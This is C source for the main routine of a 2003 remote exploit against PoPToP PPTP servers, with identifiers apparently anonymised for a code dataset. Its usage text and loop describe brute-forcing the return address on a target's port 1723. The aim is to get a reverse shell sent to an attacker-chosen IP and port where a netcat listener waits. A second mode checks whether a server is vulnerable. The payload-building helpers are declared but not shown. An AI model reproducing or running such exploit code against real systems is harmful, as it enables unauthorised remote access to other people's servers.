
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int ctrl_type; int length; } ;
struct pptp_reply {TYPE_1__ header; } ;
typedef int DWORD ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int ) ;
 int FUNC_2 (char*) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int ) ;
 int FUNC_5 (char*,...) ;
 int FUNC_6 (int ,char*,int,int ) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (int ,int,char*,int) ;
 int FUNC_9 (int) ;
 int VAR_3 ;

int FUNC_10(int VAR_4, char** VAR_5)
{
        FUNC_5("\n");
        FUNC_5("                   D  H     H                            \n");
        FUNC_5("                   D  H     H     T\n");
        FUNC_5("                   D  H  H  H     T     EE    AA   M   M \n");
        FUNC_5("               DDD D  HHHHHHH     T    E  E  A  A  MM MM \n");
        FUNC_5("              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \n");
        FUNC_5("             D     D  H     H     T    EEE   AAAA  M M M \n");
        FUNC_5("              D    D  H     H     T    E     A  A  M   M \n");
        FUNC_5("               DDDD   H     H      TTT  EEE  A  A  M   M   ");
        FUNC_5(" ... presents ... \n\n");
   FUNC_5("Exploit for PoPToP PPTP server older than \n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
        FUNC_5("by .einstein., April 2003.\n");
        FUNC_5("\n");
  if (VAR_4 < 2)
  {
        FUNC_5("usage: \n");
        FUNC_5("  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\n\n",VAR_5[0]);
        FUNC_5("    <pptp_server> is the ip address or hostname of the PoPToP server\n");
        FUNC_5("      you want to attack.  Port 1723 is used for connection\n");
        FUNC_5("    <your_ip> and <your_port> - specify an ip address to which\n");
        FUNC_5("      a connection is possible to port <your_port> and set up a\n");
        FUNC_5("      netcat listener. You'll get a reverse shell.\n");
        FUNC_5("    <timeout> is a delay between stack bruteforce attemts, in milliseconds\n");
        FUNC_5("   If you only pass a single parameter, the program will check\n");
        FUNC_5("   whether remote server is vulnerable or not. Otherwise it will\n");
        FUNC_5("   perform a ret bruteforce.\n");
        FUNC_5("usage examples:\n");
        FUNC_5("  %s 192.168.1.2 192.168.1.1 5555\n",VAR_5[0]);
        FUNC_5("    attack 192.168.1.2 and get a reverse shell on port 5555\n");
        FUNC_5("  %s 127.0.0.1 127.0.0.1 6666 100\n",VAR_5[0]);
        FUNC_5("    attack a locally running pptpd with a timeout of 100 ms\n");
        FUNC_5("    and get a shell on port 6666.\n");
        FUNC_5("  %s 192.168.1.56\n",VAR_5[0]);
        FUNC_5("    check if the PoPToP server on 192.168.1.56 is vulnerable.\n");
 return 0;
  }


  int VAR_6 = 500;
  if (VAR_4 >= 5) VAR_6 = FUNC_0(VAR_5[4]);

        DWORD VAR_7;
        if (VAR_4 == 2)
        {
                if (!FUNC_2(VAR_5[1])) return 1;

                FUNC_5("\nChecking if the server is vulnerable..\n");
                FUNC_5("(if it is you have to wait 65 seconds)..\n");
                FUNC_7(VAR_3);

                VAR_7 = 0x01010101;
                int VAR_8;
                struct pptp_reply VAR_9;


                VAR_8 = FUNC_6(VAR_3,(char*)&VAR_9,2,0);
                VAR_8 = FUNC_4(VAR_9.header.length);
                VAR_8 = FUNC_6(VAR_3,(char*)&VAR_9+2,VAR_8-2,0);
                int VAR_10 = FUNC_3(VAR_9.header.ctrl_type);
                FUNC_8(VAR_3,VAR_7,"0.0.0.0",0);


                VAR_8 = FUNC_6(VAR_3,(char*)&VAR_9,2,0);
                FUNC_5("PoPToP server is ");
                if (VAR_8 != -1) FUNC_5("vulnerable!\n");
                else FUNC_5("not vulnerable\n");
                FUNC_1(VAR_3);

                return 1;
        }

        FUNC_5("[!] Attempting bruteforce against %s\n",VAR_5[1]);
        FUNC_5("interrupt when you get a shell to %s on port %d...\n\n",VAR_5[2],FUNC_0(VAR_5[3]));

        int VAR_11 = 0;

        for (VAR_7 = VAR_2; VAR_7 >=VAR_0; VAR_7 -= VAR_1)
        {
           FUNC_5("[*] ");
                if (!FUNC_2(VAR_5[1])) return 1;
         FUNC_5("[ret=0x%x]..",VAR_7);
         FUNC_5("sending payload..");


                FUNC_7(VAR_3);


           FUNC_8(VAR_3,VAR_7,VAR_5[2],FUNC_0(VAR_5[3]));
                FUNC_1(VAR_3);

                FUNC_9(VAR_6);
                FUNC_5("done\n");
        }

        return 0;
}
